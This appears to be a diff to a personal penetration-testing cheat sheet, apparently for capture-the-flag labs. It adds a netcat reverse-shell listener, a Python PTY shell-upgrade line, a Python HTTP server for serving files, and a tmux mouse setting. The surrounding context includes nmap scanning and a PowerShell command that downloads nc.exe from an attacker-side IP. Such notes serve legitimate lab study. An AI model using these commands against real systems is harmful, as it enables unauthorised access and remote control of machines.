@@ -5,10 +5,12 @@
 # Shows version information
 nmap -sC -sV -oA <name> <ip>
 ```
+
 ## Reverse shell
 
 Listen locally with nc
-```
+```bash
+# n is important!
 nc -lvnp 4444
 ```
 
@@ -29,6 +31,8 @@ powershell Invoke-Webrequest -OutFile C:\temp\nc.exe -Uri http://10.10.14.116/nc
 Using Python for a psuedo terminal
 
 ```bash
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
 # In reverse shell
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
@@ -42,6 +46,11 @@ $ reset
 $ export SHELL=bash
 $ export TERM=xterm-256color
 $ stty rows <num> columns <cols>
+```
+
+## Sharing files
+```
+python3 -m http.server 8000
 ```
 
 # Exploits
@@ -82,6 +91,7 @@ prefix key: ctrl+b
 |,|rename tab|
 |space|cycle looks|
 |t|show time|
+|:set -g mouse on|enable mouse|
 
 ## msfvenom
 Payload generator
